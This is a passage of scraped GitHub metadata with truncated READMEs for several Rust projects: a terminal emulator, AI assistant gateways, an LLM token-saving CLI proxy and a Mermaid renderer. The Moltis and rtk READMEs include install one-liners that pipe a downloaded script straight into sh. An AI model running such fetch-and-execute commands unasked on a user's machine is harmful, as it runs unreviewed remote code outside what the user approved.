      "homepage": "https://x.com/HiTw93/status/2023579857188479196",
      "created_at": "2026-02-07T13:00:49Z",
      "updated_at": "2026-02-20T03:25:31Z",
      "pushed_at": "2026-02-19T11:53:56Z"
    },
    "stats": {
      "stars": 1656,
      "forks": 67,
      "watchers": 1656,
      "open_issues": 1,
      "size": 19575
    },
    "tech_info": {
      "language": "Rust",
      "languages": {
        "Rust": 15085077,
        "Shell": 81328,
        "Lua": 34637,
        "GLSL": 5446,
        "WGSL": 3641,
        "Makefile": 1429
      },
      "license": "Other",
      "topics": [
        "ai-coding",
        "macos",
        "rust",
        "serial",
        "terminal",
        "terminal-app",
        "terminal-emulator",
        "vibe-coding"
      ]
    },
    "content": {
      "readme": "<div align=\"center\">\n  <h1>Kaku</h1>\n  <p><em>A fast, out-of-the-box terminal built for AI coding.</em></p>\n</div>\n\n<p align=\"center\">\n  <a href=\"https://github.com/tw93/Kaku/stargazers\"><img src=\"https://img.shields.io/github/stars/tw93/Kaku?style=flat-square\" alt=\"Stars\"></a>\n  <a href=\"https://github.com/tw93/Kaku/releases\"><img src=\"https://img.shields.io/github/v/tag/tw93/Kaku?label=version&style=flat-square\" alt=\"Version\"></a>\n  <a href=\"LICENSE.md\"><img src=\"https://img.shields.io/badge/license-MIT-blue.svg?style=flat-square\" alt=\"License\"></a>\n  <a href=\"https://github.com/tw93/Kaku/commits\"><img src=\"https://img.shields.io/github/commit-activity/m/tw93/Kaku?style=flat-square\" alt=\"Commits\"></a>\n  <a href=\"https://twitter.com/HiTw93\"><img src=\"https://img.shields.io/badge/follow-Tw93-red?style=flat-square&logo=Twitter\" alt=\"Twitter\"></a>\n</p>\n\n<p align=\"center\">\n  <img src=\"assets/kaku.jpeg\" alt=\"Kaku Screenshot\" width=\"1000\" />\n  <br/>\n  Kaku is a deeply customized fork of <a href=\"https://github.com/wez/wezterm\">WezTerm</a>, designed for an out-of-the-box experience.\n</p>\n\n## Features\n\n- **Zero Config**: Defaults with JetBrains Mono, opencode theme, macOS font rendering, and low-res font sizing.\n- **Curated Shell Suite**: Built-in zsh plugins with optional CLI tools for prompt, diff, and navigation workflows.\n- **Fast & Lightweight**: 40% smaller binary, instant startup, lazy loading, stripped-down GPU-accelerated core.\n- **WezTerm-Compatible Config**: Use WezTerm's Lua config directly with full API compatibility and no migration.\n\n## Quick Start\n\n1. [Download Kaku DMG](https://github.com/tw93/Kaku/releases/latest) & Drag to Applications\n2. Or install with Homebrew: `brew install tw93/tap/kakuku`\n3. Open Kaku. The app is notarized by Apple, so it opens without security warnings\n4. On first launch, Kaku will automatically set up your shell environment\n\n## Usage Guide\n\nKaku comes with intuitive macOS-native shortcuts:\n\n| Action | Shortcut |\n| :--- | :--- |\n| New Tab | `Cmd + T` |\n| New Window | `Cmd + N` |\n| Close Tab/Pane | `Cmd + W` |\n| Navigate Tabs | `Cmd + Shift + [`, `Cmd + Shift + ]` or `Cmd + 1-9` |\n| Navigate Panes | `Cmd + Opt + Arrows` |\n| Split Pane Vertical | `Cmd + D` |\n| Split Pane Horizontal | `Cmd + Shift + D` |\n| Toggle Split Direction | `Cmd + Shift + S` |\n| Zoom/Unzoom Pane | `Cmd + Shift + Enter` |\n| Resize Pane | `Cmd + Ctrl + Arrows` |\n| Clear Screen | `Cmd + K` |\n| Kaku AI Config | `Cmd + Shift + A` |\n| Open Lazygit | `Cmd + Shift + G` |\n| Font Size | `Cmd + +`, `Cmd + -`, `Cmd + 0` |\n| Smart Jump | `z <dir>` |\n| Smart Select | `z -l <dir>` |\n| Recent Dirs | `z -t` |\n\n## Configuration\n\nKaku comes with a carefully curated shell stack for immediate productivity, so you can focus on AI coding without opening vscode:\n\nBuilt-in zsh plugins bundled by default:\n\n- **z**: A smarter cd command that learns your most used directories for instant navigation.\n- **zsh-completions**: Extended command and subcommand completion definitions.\n- **Syntax Highlighting**: Real-time command validation and coloring.\n- **Autosuggestions**: Intelligent, history-based completions similar to Fish shell.\n\nOptional CLI tools installed via Homebrew during `kaku init`:\n\n- **Starship**: A fast, customizable prompt showing git status, package versions, and execution time.\n- **Delta**: A syntax-highlighting pager for git, diff, and grep output.\n- **Lazygit**: A terminal UI for fast, visual Git workflows without leaving the shell.\n\nKaku uses `~/.config/kaku/kaku.lua` for configuration, fully compatible with WezTerm's Lua API, with built-in defaults at `Kaku.app/Contents/Resources/kaku.lua` as fallback.\n\nRun `kaku` in your terminal to see all available commands such as `kaku update`, `kaku reset`, and `kaku config`.\n\n## Why Kaku?\n\nI heavily rely on the CLI for both work and personal projects. Tools I've built, like [Mole](https://github.com/tw93/mole) and [Pake](https://github.com/tw93/pake), reflect this.\n\nI used Alacritty for years and learned to value speed and simplicity. As my workflow shifted toward AI-assisted coding, I wanted stronger tab and pane ergonomics. I also explored Kitty, Ghostty, Warp, and iTerm2. Each is strong in different areas, but I still wanted a setup that matched my own balance of performance, defaults, and control.\n\nWezTerm is robust and highly hackable, and I am grateful for its engine and ecosystem. Kaku builds on that foundation with practical defaults for day one use, while keeping full Lua-based customization and a fast, lightweight feel.\n\nSo I built Kaku to be that environment: fast, polished, and ready to work.\n\n### Performance\n\n| Metric | Upstream | Kaku | Methodology |\n| :--- | :--- | :--- | :--- |\n| **Executable Size** | ~67 MB | ~40 MB | Aggressive symbol stripping & feature pruning |\n| **Resources Volume** | ~100 MB | ~80 MB | Asset optimization & lazy-loaded assets |\n| **Launch Latency** | Standard | Instant | Just-in-time initialization |\n| **Shell Bootstrap** | ~200ms |",
      "default_branch": "main"
    },
    "fetched_at": "2026-02-20T03:28:16.338511"
  },
  {
    "basic_info": {
      "name": "moltis",
      "full_name": "moltis-org/moltis",
      "owner": "moltis-org",
      "description": "A personal AI assistant built in Rust. Single binary, multi-provider LLMs, long-term memory, sandboxed execution, voice, MCP tools, and multi-channel access (web, Telegram, API).",
      "url": "https://github.com/moltis-org/moltis",
      "clone_url": "https://github.com/moltis-org/moltis.git",
      "ssh_url": "git@github.com:moltis-org/moltis.git",
      "homepage": "https://moltis.org",
      "created_at": "2026-01-29T19:36:31Z",
      "updated_at": "2026-02-20T03:15:39Z",
      "pushed_at": "2026-02-20T02:23:04Z"
    },
    "stats": {
      "stars": 1188,
      "forks": 120,
      "watchers": 1188,
      "open_issues": 59,
      "size": 17239
    },
    "tech_info": {
      "language": "Rust",
      "languages": {
        "Rust": 5114278,
        "JavaScript": 1038543,
        "CSS": 164873,
        "HTML": 67541,
        "Shell": 48112,
        "Just": 7415,
        "Dockerfile": 2822,
        "Python": 1835,
        "Ruby": 1456,
        "Nix": 1075
      },
      "license": "MIT License",
      "topics": [
        "ai-agent",
        "ai-assistant",
        "clawdbot",
        "llm",
        "mcp",
        "openclaw",
        "rust",
        "sandbox",
        "self-hosted",
        "single-binary",
        "telegram-bot",
        "voice-assistant"
      ]
    },
    "content": {
      "readme": "<div align=\"center\">\n\n<a href=\"https://moltis.org\"><img src=\"https://raw.githubusercontent.com/moltis-org/moltis-website/main/favicon-512.svg\" alt=\"Moltis\" width=\"120\"></a>\n\n# Moltis\n\n**A personal AI gateway written in Rust. One binary, no runtime, no npm.**\n\n[![CI](https://github.com/moltis-org/moltis/actions/workflows/ci.yml/badge.svg)](https://github.com/moltis-org/moltis/actions/workflows/ci.yml)\n[![codecov](https://codecov.io/gh/moltis-org/moltis/graph/badge.svg)](https://codecov.io/gh/moltis-org/moltis)\n[![CodSpeed](https://img.shields.io/endpoint?url=https://codspeed.io/badge.json&style=flat&label=CodSpeed)](https://codspeed.io/moltis-org/moltis)\n[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)\n[![Rust](https://img.shields.io/badge/Rust-1.91%2B-orange.svg)](https://www.rust-lang.org)\n<!-- [![Discord](https://img.shields.io/discord/1469505370169933837?color=5865F2&label=Discord&logo=discord&logoColor=white)](https://discord.gg/XnmrepsXp5) -->\n\n[Features](#features) ‚Ä¢ [Installation](#installation) ‚Ä¢ [Build](#build) ‚Ä¢ [Cloud Deployment](#cloud-deployment) ‚Ä¢ [How It Works](#how-it-works) ‚Ä¢ [Hooks](#hooks) ‚Ä¢ [Contributing](CONTRIBUTING.md) ‚Ä¢ [Discord](https://discord.gg/XnmrepsXp5)\n\n</div>\n\n---\n\nInspired by [OpenClaw](https://docs.openclaw.ai) ‚Äî just build it and run it.\n\n## Installation\n\n```bash\n# One-liner install script (macOS / Linux)\ncurl -fsSL https://www.moltis.org/install.sh | sh\n\n# macOS / Linux via Homebrew\nbrew install moltis-org/tap/moltis\n\n# Docker (multi-arch: amd64/arm64)\ndocker pull ghcr.io/moltis-org/moltis:latest\n\n# Or build from source\ncargo install moltis --git https://github.com/moltis-org/moltis\n```\n\n## Features\n\n- **Multi-provider LLM support** ‚Äî OpenAI Codex, GitHub Copilot, and Local\n  LLM through a trait-based provider architecture\n- **Streaming responses** ‚Äî real-time token streaming for a responsive user\n  experience, including when tools are enabled (tool calls stream argument\n  deltas as they arrive)\n- **Communication channels** ‚Äî Telegram integration with an extensible channel\n  abstraction for adding others\n- **Web gateway** ‚Äî HTTP and WebSocket server with a built-in web UI\n- **Session persistence** ‚Äî SQLite-backed conversation history, session\n  management, and per-session run serialization to prevent history corruption\n- **Agent-level timeout** ‚Äî configurable wall-clock timeout for agent runs\n  (default 600s) to prevent runaway executions\n- **Sub-agent delegation** ‚Äî `spawn_agent` tool lets the LLM delegate tasks to\n  child agent loops with nesting depth limits and tool filtering\n- **Message queue modes** ‚Äî `followup` (default, replay each queued message as a\n  separate run) or `collect` (concatenate and send once) when messages arrive\n  during an active run\n- **Tool result sanitization** ‚Äî strips base64 data URIs and long hex blobs,\n  truncates oversized results before feeding back to the LLM (configurable\n  limit, default 50 KB)\n- **Memory and knowledge base** ‚Äî embeddings-powered long-term memory\n- **Skills** ‚Äî extensible skill system with support for existing repositories\n- **Hook system** ‚Äî lifecycle hooks with priority ordering, parallel dispatch\n  for read-only events, circuit breaker, dry-run mode, HOOK.md-based discovery,\n  eligibility checks, bundled hooks (boot-md, session-memory, command-logger),\n  CLI management (`moltis hooks list/info`), and web UI for editing, enabling/disabling,\n  and reloading hooks at runtime\n- **Web browsing** ‚Äî web search (Brave, Perplexity) and URL fetching with\n  readability extraction and SSRF protection\n- **Voice support** ‚Äî Text-to-speech (TTS) and speech-to-text (STT) with\n  multiple cloud and local providers. Configure and manage voice providers\n  from the Settings UI.\n- **Scheduled tasks** ‚Äî cron-based task execution\n- **OAuth flows** ‚Äî built-in OAuth2 for provider authentication\n- **TLS support** ‚Äî automatic self-signed certificate generation\n- **Observability** ‚Äî OpenTelemetry tracing with OTLP export\n- **MCP (Model Context Protocol) support** ‚Äî connect to MCP tool servers over\n  stdio or HTTP/SSE (remote servers), with health polling, automatic restart\n  on crash (exponential backoff), and in-UI server config editing\n- **Parallel tool execution** ‚Äî when the LLM requests multiple tool calls in\n  one turn, they run concurrently via `futures::join_all`, reducing latency\n- **Sandboxed execution** ‚Äî Docker and Apple Container backends with pre-built\n  images, configurable packages, and per-session isolation\n- **Authentication** ‚Äî password and passkey (WebAuthn) authentication with\n  session cookies, API key support, and a first-run setup code flow\n- **Endpoint throttling** ‚Äî built-in per-IP request throttling for\n  unauthenticated traffic when auth is enforced, with strict limits for\n  password login attempts and sensible caps for API/WS traffic (`429` +\n  `Retry-After` on limit hit)\n- **WebSocket security** ‚Äî Origin validation to prevent Cross-Site WebSocket\n  Hijacking (CSWSH)\n- **Onboarding wizar",
      "default_branch": "main"
    },
    "fetched_at": "2026-02-20T03:28:17.529114"
  },
  {
    "basic_info": {
      "name": "rtk",
      "full_name": "rtk-ai/rtk",
      "owner": "rtk-ai",
      "description": "CLI proxy that reduces LLM token consumption by 60-90% on common dev commands. Single Rust binary, zero dependencies",
      "url": "https://github.com/rtk-ai/rtk",
      "clone_url": "https://github.com/rtk-ai/rtk.git",
      "ssh_url": "git@github.com:rtk-ai/rtk.git",
      "homepage": "https://www.rtk-ai.app",
      "created_at": "2026-01-22T16:54:16Z",
      "updated_at": "2026-02-20T03:23:01Z",
      "pushed_at": "2026-02-19T19:13:15Z"
    },
    "stats": {
      "stars": 1059,
      "forks": 77,
      "watchers": 1059,
      "open_issues": 68,
      "size": 805
    },
    "tech_info": {
      "language": "Rust",
      "languages": {
        "Rust": 837613,
        "Shell": 99792,
        "Ruby": 1171
      },
      "license": "MIT License",
      "topics": [
        "agentic-coding",
        "ai-coding",
        "anthropic",
        "claude-code",
        "cli",
        "command-line-tool",
        "cost-reduction",
        "developer-tools",
        "llm",
        "open-source",
        "productivity",
        "rust",
        "token-optimization"
      ]
    },
    "content": {
      "readme": "# rtk - Rust Token Killer\n\n[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)\n\n**High-performance CLI proxy to minimize LLM token consumption.**\n\n[Website](https://www.rtk-ai.app) | [GitHub](https://github.com/rtk-ai/rtk) | [Install](INSTALL.md)\n\nrtk filters and compresses command outputs before they reach your LLM context, saving 60-90% of tokens on common operations.\n\n## ‚ö†Ô∏è Important: Name Collision Warning\n\n**There are TWO different projects named \"rtk\":**\n\n1. ‚úÖ **This project (Rust Token Killer)** - LLM token optimizer\n   - Repos: `rtk-ai/rtk`\n   - Purpose: Reduce Claude Code token consumption\n\n2. ‚ùå **reachingforthejack/rtk** - Rust Type Kit (DIFFERENT PROJECT)\n   - Purpose: Query Rust codebase and generate types\n   - **DO NOT install this one if you want token optimization**\n\n**How to verify you have the correct rtk:**\n```bash\nrtk --version   # Should show \"rtk 0.20.1\"\nrtk gain        # Should show token savings stats\n```\n\nIf `rtk gain` doesn't exist, you installed the wrong package. See installation instructions below.\n\n## Token Savings (30-min Claude Code Session)\n\nTypical session without rtk: **~150,000 tokens**\nWith rtk: **~45,000 tokens** ‚Üí **70% reduction**\n\n| Operation | Frequency | Standard | rtk | Savings |\n|-----------|-----------|----------|-----|---------|\n| `ls` / `tree` | 10√ó | 2,000 | 400 | -80% |\n| `cat` / `read` | 20√ó | 40,000 | 12,000 | -70% |\n| `grep` / `rg` | 8√ó | 16,000 | 3,200 | -80% |\n| `git status` | 10√ó | 3,000 | 600 | -80% |\n| `git diff` | 5√ó | 10,000 | 2,500 | -75% |\n| `git log` | 5√ó | 2,500 | 500 | -80% |\n| `git add/commit/push` | 8√ó | 1,600 | 120 | -92% |\n| `npm test` / `cargo test` | 5√ó | 25,000 | 2,500 | -90% |\n| `ruff check` | 3√ó | 3,000 | 600 | -80% |\n| `pytest` | 4√ó | 8,000 | 800 | -90% |\n| `go test` | 3√ó | 6,000 | 600 | -90% |\n| `docker ps` | 3√ó | 900 | 180 | -80% |\n| **Total** | | **~118,000** | **~23,900** | **-80%** |\n\n> Estimates based on medium-sized TypeScript/Rust projects. Actual savings vary by project size.\n\n## Installation\n\n### ‚ö†Ô∏è Pre-Installation Check (REQUIRED)\n\n**ALWAYS verify if rtk is already installed before installing:**\n\n```bash\nrtk --version        # Check if installed\nrtk gain             # Verify it's the Token Killer (not Type Kit)\nwhich rtk            # Check installation path\n```\n\nIf already installed and `rtk gain` works, **DO NOT reinstall**. Skip to Quick Start.\n\n### Homebrew (macOS/Linux)\n\n```bash\nbrew install rtk\n```\n\n### Quick Install (Linux/macOS)\n\n```bash\ncurl -fsSL https://raw.githubusercontent.com/rtk-ai/rtk/refs/heads/master/install.sh | sh\n```\n\n> **Note**: rtk installs to `~/.local/bin` by default. If this directory is not in your PATH, add it:\n> ```bash\n> echo 'export PATH=\"$HOME/.local/bin:$PATH\"' >> ~/.bashrc  # or ~/.zshrc\n> ```\n\nAfter installation, **verify you have the correct rtk**:\n```bash\nrtk gain  # Must show token savings stats (not \"command not found\")\n```\n\n### Alternative: Manual Installation\n\n```bash\n# From rtk-ai upstream (maintained by pszymkowiak)\ncargo install --git https://github.com/rtk-ai/rtk\n\n# OR if published to crates.io\ncargo install rtk\n```\n\n‚ö†Ô∏è **WARNING**: `cargo install rtk` from crates.io might install the wrong package (Type Kit instead of Token Killer). Always verify with `rtk gain` after installation.\n\n### Alternative: Pre-built Binaries\n\nDownload from [rtk-ai/releases](https://github.com/rtk-ai/rtk/releases):\n- macOS: `rtk-x86_64-apple-darwin.tar.gz` / `rtk-aarch64-apple-darwin.tar.gz`\n- Linux: `rtk-x86_64-unknown-linux-gnu.tar.gz` / `rtk-aarch64-unknown-linux-gnu.tar.gz`\n- Windows: `rtk-x86_64-pc-windows-msvc.zip`\n\n## Quick Start\n\n```bash\n# 1. Verify installation\nrtk gain  # Must show token stats, not \"command not found\"\n\n# 2. Initialize for Claude Code (RECOMMENDED: hook-first mode)\nrtk init --global\n# ‚Üí Installs hook + creates slim RTK.md (10 lines, 99.5% token savings)\n# ‚Üí Follow printed instructions to add hook to ~/.claude/settings.json\n\n# 3. Test it works\nrtk git status  # Should show ultra-compact output\nrtk init --show # Verify hook is installed and executable\n\n# Alternative modes:\n# rtk init --global --claude-md  # Legacy: full injection (137 lines)\n# rtk init                       # Local project only (./CLAUDE.md)\n```\n\n**New in v0.9.5**: Hook-first installation eliminates ~2000 tokens from Claude's context while maintaining full RTK functionality through transparent command rewriting.\n\n## Global Flags\n\n```bash\n-u, --ultra-compact    # ASCII icons, inline format (extra token savings)\n-v, --verbose          # Increase verbosity (-v, -vv, -vvv)\n```\n\n## Commands\n\n### Files\n```bash\nrtk ls .                        # Token-optimized directory tree\nrtk read file.rs                # Smart file reading\nrtk read file.rs -l aggressive  # Signatures only (strips bodies)\nrtk smart file.rs               # 2-line heuristic code summary\nrtk find \"*.rs\" .               # Compact find results\nrtk grep \"pattern\" .            # Grouped search results\n",
      "default_branch": "master"
    },
    "fetched_at": "2026-02-20T03:28:18.712852"
  },
  {
    "basic_info": {
      "name": "localgpt",
      "full_name": "localgpt-app/localgpt",
      "owner": "localgpt-app",
      "description": "AI assistant on local device & world generations.",
      "url": "https://github.com/localgpt-app/localgpt",
      "clone_url": "https://github.com/localgpt-app/localgpt.git",
      "ssh_url": "git@github.com:localgpt-app/localgpt.git",
      "homepage": "https://localgpt.app",
      "created_at": "2026-02-01T17:32:52Z",
      "updated_at": "2026-02-20T02:34:04Z",
      "pushed_at": "2026-02-20T02:34:01Z"
    },
    "stats": {
      "stars": 977,
      "forks": 72,
      "watchers": 977,
      "open_issues": 6,
      "size": 738
    },
    "tech_info": {
      "language": "Rust",
      "languages": {
        "Rust": 1020567,
        "JavaScript": 23399,
        "CSS": 10790,
        "HTML": 6741,
        "Shell": 4366,
        "Dockerfile": 1157,
        "C": 641
      },
      "license": "Apache License 2.0",
      "topics": [
        "agent",
        "ai",
        "rust",
        "world"
      ]
    },
    "content": {
      "readme": "\n# <img src=\"https://localgpt.app/logo/localgpt-icon-app.png\" width=\"50\" height=\"50\" alt=\"LocalGPT\" /> LocalGPT\n\n[![License](https://img.shields.io/badge/license-Apache%202.0-blue.svg)](https://github.com/localgpt-app/localgpt#license)\n[![Crates.io](https://img.shields.io/crates/v/localgpt.svg)](https://crates.io/crates/localgpt)\n[![Downloads](https://img.shields.io/crates/d/localgpt.svg)](https://crates.io/crates/localgpt)\n[![Docs](https://docs.rs/localgpt/badge.svg)](https://docs.rs/localgpt/latest/localgpt)\n[![CI](https://github.com/localgpt-app/localgpt/workflows/CI/badge.svg)](https://github.com/localgpt-app/localgpt/actions)\n[![Discord](https://img.shields.io/discord/691052431525675048.svg?label=&logo=discord&logoColor=ffffff&color=7389D8&labelColor=6A7EC2)](https://discord.gg/yMQ8tfxG)\n\nA local device focused AI assistant built in Rust ‚Äî persistent memory, autonomous tasks. Inspired by and compatible with OpenClaw.\n\n`cargo install localgpt`\n\n## Why LocalGPT?\n\n- **Single binary** ‚Äî no Node.js, Docker, or Python required\n- **Local device focused** ‚Äî runs entirely on your machine, your memory data stays yours\n- **Persistent memory** ‚Äî markdown-based knowledge store with full-text and semantic search\n- **Hybrid web search** ‚Äî native provider search passthrough plus client-side fallback providers\n- **Autonomous heartbeat** ‚Äî delegate tasks and let it work in the background\n- **Multiple interfaces** ‚Äî CLI, web UI, desktop GUI, Telegram bot\n- **Defense-in-depth security** ‚Äî signed policy files, kernel-enforced sandbox, prompt injection defenses\n- **Multiple LLM providers** ‚Äî Anthropic (Claude), OpenAI, xAI (Grok), Ollama, GLM (Z.AI), OAuth subscriptions (Claude Pro/Max, Gemini)\n- **OpenClaw compatible** ‚Äî works with SOUL, MEMORY, HEARTBEAT markdown files and skills format\n\n## Install\n\n```bash\n# From crates.io (includes desktop GUI)\ncargo install localgpt\n\n# Headless (no desktop GUI ‚Äî for servers, Docker, CI)\ncargo install localgpt --no-default-features\n\n# From source checkout\ncargo install --path crates/cli\n```\n\n## Quick Start\n\n```bash\n# Initialize configuration\nlocalgpt config init\n\n# Start interactive chat\nlocalgpt chat\n\n# Ask a single question\nlocalgpt ask \"What is the meaning of life?\"\n\n# Inspect resolved config/data/state/cache paths\nlocalgpt paths\n\n# Run as a daemon with heartbeat, HTTP API and web ui\nlocalgpt daemon start\n```\n\n## How It Works\n\nLocalGPT uses XDG-compliant directories (or platform equivalents) for config/data/state/cache. Run `localgpt paths` to see your resolved paths.\n\nWorkspace memory layout:\n\n```\n<data_dir>/workspace/\n‚îú‚îÄ‚îÄ MEMORY.md            # Long-term knowledge (auto-loaded each session)\n‚îú‚îÄ‚îÄ HEARTBEAT.md         # Autonomous task queue\n‚îú‚îÄ‚îÄ SOUL.md              # Personality and behavioral guidance\n‚îî‚îÄ‚îÄ knowledge/           # Structured knowledge bank (optional)\n    ‚îú‚îÄ‚îÄ finance/\n    ‚îú‚îÄ‚îÄ legal/\n    ‚îî‚îÄ‚îÄ tech/\n```\n\nFiles are indexed with SQLite FTS5 for fast keyword search, and sqlite-vec for semantic search with local embeddings.\n\n## Configuration\n\nStored at `<config_dir>/config.toml` (run `localgpt config path` or `localgpt paths`):\n\n```toml\n[agent]\ndefault_model = \"claude-cli/opus\"\n\n[providers.anthropic]\napi_key = \"${ANTHROPIC_API_KEY}\"\n\n[heartbeat]\nenabled = true\ninterval = \"30m\"\nactive_hours = { start = \"09:00\", end = \"22:00\" }\n\n[memory]\nworkspace = \"~/.local/share/localgpt/workspace\" # optional override\n\n# Optional: Telegram bot\n[telegram]\nenabled = true\napi_token = \"${TELEGRAM_BOT_TOKEN}\"\n```\n\n### Using a local OpenAI-compatible server (LM Studio, llamafile, etc.)\n\nIf you run a local server that speaks the OpenAI API (e.g., LM Studio, llamafile, vLLM), point LocalGPT at it and pick an `openai/*` model ID so it does **not** try to spawn the `claude` CLI:\n\n1. Start your server (LM Studio default port: `1234`; llamafile default: `8080`) and note its model name.\n2. Edit your config file (`localgpt config path`):\n   ```toml\n   [agent]\n   default_model = \"openai/<your-model-name>\"\n\n   [providers.openai]\n   # Many local servers accept a dummy key\n   api_key = \"not-needed\"\n   base_url = \"http://127.0.0.1:8080/v1\" # or http://127.0.0.1:1234/v1 for LM Studio\n   ```\n3. Run `localgpt chat` (or `localgpt daemon start`) and requests will go to your local server.\n\nTip: If you see `Failed to spawn Claude CLI`, change `agent.default_model` away from `claude-cli/*` or install the `claude` CLI.\n\n### Web Search\n\nConfigure web search providers under `[tools.web_search]` and validate with:\n\n```bash\nlocalgpt search test \"rust async runtime\"\nlocalgpt search stats\n```\n\nFull setup guide: [`docs/web-search.md`](docs/web-search.md)\n\n### OAuth Subscription Plans\n\nUse Claude Pro/Max or Google Gemini subscription credentials via OAuth instead of pay-per-request API keys:\n\n```toml\n# Claude Pro/Max OAuth (preferred over api_key when configured)\n[providers.anthropic_oauth]\naccess_token = \"${ANTHROPIC_OAUTH_TOKEN}\"\nrefresh_token = \"${ANTHROPIC_OAUTH_REFRESH_TOKEN}\"\n\n# Google Gemini subscription OAuth\n[providers",
      "default_branch": "main"
    },
    "fetched_at": "2026-02-20T03:28:19.869857"
  },
  {
    "basic_info": {
      "name": "mermaid-rs-renderer",
      "full_name": "1jehuang/mermaid-rs-renderer",
      "owner": "1jehuang",
      "description": "A fast native Rust Mermaid diagram renderer. No browser required. 500-1000x faster than mermaid-cli.",
      "url": "https://github.com/1jehuang/mermaid-rs-renderer",
      "clone_url": "https://github.com/1jehuang/mermaid-rs-renderer.git",
      "ssh_url": "git@github.com:1jehuang/mermaid-rs-renderer.git",
      "homepage": null,
      "created_at": "2026-01-22T06:18:34Z",
      "updated_at": "2026-02-19T19:23:15Z",
      "pushed_at": "2026-02-14T22:02:36Z"
    },
    "stats": {
      "stars": 966,
      "forks": 28,
      "watchers": 966,
      "open_issues": 17,
      "size": 24559
    },
    "tech_info": {
      "language": "Rust",
      "languages": {
        "Rust": 1402164,
        "Python": 309419,
        "Mermaid": 40468,
        "HTML": 24719,
        "Shell": 2418
      },
      "license": "MIT License",
      "topics": [
        "cli",
        "diagram",
        "flowchart",
        "mermaid",
        "rust",
        "svg"
      ]
    },
    "content": {
      "readme": "<div align=\"center\">\n\n# mmdr\n\n**100‚Äì1400x faster Mermaid rendering. Pure Rust. Zero browser dependencies.**\n\n[Installation](#installation) | [Quick Start](#quick-start) | [Benchmarks](#performance) | [Examples](#diagram-types)\n\n</div>\n\n## Performance\n\nmmdr renders diagrams **100‚Äì1400x faster** than mermaid-cli by eliminating browser overhead.\nWith the built-in font cache (warm after first run), tiny diagrams reach **500‚Äì900√ó** (and `--fastText` exceeds **1600√ó**).\n\n<p align=\"center\">\n  <img src=\"docs/benchmarks/comparison.svg\" alt=\"Performance comparison\" width=\"600\">\n</p>\n\n<div align=\"center\">\n\n| Diagram | mmdr | mermaid-cli | Speedup |\n|:--------|-----:|------------:|--------:|\n| Flowchart | 4.49 ms | 1,971 ms | **439x** |\n| Class Diagram | 4.67 ms | 1,907 ms | **408x** |\n| State Diagram | 3.97 ms | 1,968 ms | **496x** |\n| Sequence Diagram | 2.71 ms | 1,906 ms | **704x** |\n\n<sub>Tested on Intel Core Ultra 7 265V, Linux 6.18.7 | mermaid-cli 11.4.2 via Puppeteer/Chromium</sub>\n\n</div>\n\n<details>\n<summary><strong>Font cache (default, warm after first run)</strong></summary>\n\nOnce the font cache is populated, tiny/common diagrams reach **500‚Äì900√ó**:\n\n| Diagram (tiny) | mmdr (warm cache) | mermaid-cli | Speedup |\n|:--|--:|--:|--:|\n| Flowchart | 2.96 ms | 2,259 ms | **764√ó** |\n| Class | 2.55 ms | 2,347 ms | **919√ó** |\n| State | 2.67 ms | 2,111 ms | **789√ó** |\n| Sequence | 3.75 ms | 2,010 ms | **536√ó** |\n\n<sub>Measured Feb 2, 2026 on the same machine.</sub>\n</details>\n\n<details>\n<summary><strong>Fast text metrics (optional, fastest)</strong></summary>\n\nEnable `--fastText` to use calibrated fallback widths for ASCII labels (avoids font DB load).\nOn tiny/common diagrams this reaches **1600‚Äì2069√ó** speedups:\n\n| Diagram (tiny) | mmdr `--fastText` | mermaid-cli | Speedup |\n|:--|--:|--:|--:|\n| Flowchart | 1.32 ms | 2,116 ms | **1,601√ó** |\n| Class | 1.23 ms | 2,314 ms | **1,880√ó** |\n| State | 1.09 ms | 2,258 ms | **2,069√ó** |\n| Sequence | 1.16 ms | 2,158 ms | **1,868√ó** |\n\n<sub>Measured Feb 2, 2026 on the same machine.</sub>\n</details>\n\n<p align=\"center\">\n  <img src=\"docs/benchmarks/breakdown.svg\" alt=\"Pipeline breakdown\" width=\"500\">\n</p>\n\n<details>\n<summary><strong>Library Performance (no CLI overhead)</strong></summary>\n\nWhen used as a Rust library, mmdr is even faster with no process spawn overhead:\n\n<p align=\"center\">\n  <img src=\"docs/benchmarks/library.svg\" alt=\"Library performance\" width=\"500\">\n</p>\n\n| Diagram | Library Time |\n|:--------|-------------:|\n| Flowchart | 1.49 ms |\n| Class Diagram | 2.51 ms |\n| State Diagram | 2.04 ms |\n| Sequence Diagram | 0.07 ms |\n\nThese are raw render times measured with Criterion, ideal for embedding in applications.\n\n</details>\n\n<details>\n<summary><strong>Extended Benchmarks</strong></summary>\n\nPerformance on larger diagrams:\n\n| Diagram | Nodes | mmdr | mermaid-cli | Speedup |\n|:--------|------:|-----:|------------:|--------:|\n| flowchart (small) | 10 | 3.38 ms | 1,910 ms | 565x |\n| flowchart (medium) | 50 | 8.71 ms | 2,018 ms | 232x |\n| flowchart (large) | 200 | 47.00 ms | 2,276 ms | 48x |\n\nThe speedup advantage decreases for very large diagrams as actual layout computation becomes more significant relative to browser startup overhead. Still, mmdr remains **100x+ faster** even for 200-node diagrams.\n\n</details>\n\n## Why mmdr?\n\nThe official `mermaid-cli` spawns a **headless Chromium browser** for every diagram, adding 2-3 seconds of startup overhead.\n\n| Use Case | mermaid-cli | mmdr |\n|:---------|:------------|:-----|\n| CI/CD pipeline with 50 diagrams | ~2 minutes | **< 1 second** |\n| Real-time editor preview | Unusable lag | **Instant** |\n| Batch doc generation | Coffee break | **Blink of an eye** |\n\nmmdr parses Mermaid syntax natively in Rust and renders directly to SVG. No browser. No Node.js. No Puppeteer.\n\n## Installation\n\n```bash\n# From source\ncargo install --path .\n\n# Homebrew (macOS/Linux)\nbrew tap 1jehuang/mmdr && brew install mmdr\n\n# Scoop (Windows)\nscoop bucket add mmdr https://github.com/1jehuang/scoop-mmdr && scoop install mmdr\n\n# AUR (Arch)\nyay -S mmdr-bin\n```\n\n## Quick Start\n\n```bash\n# Pipe diagram to stdout\necho 'flowchart LR; A-->B-->C' | mmdr -e svg\n\n# File to file\nmmdr -i diagram.mmd -o output.svg -e svg\nmmdr -i diagram.mmd -o output.png -e png\n\n# Render all diagrams from a Markdown file\nmmdr -i README.md -o ./diagrams/ -e svg\n```\n\n## Diagram Types\n\nmmdr supports **23 Mermaid diagram types**:\n\n| Category | Diagrams |\n|:---------|:---------|\n| **Core** | Flowchart, Sequence, Class, State |\n| **Data** | ER Diagram, Pie Chart, XY Chart, Quadrant 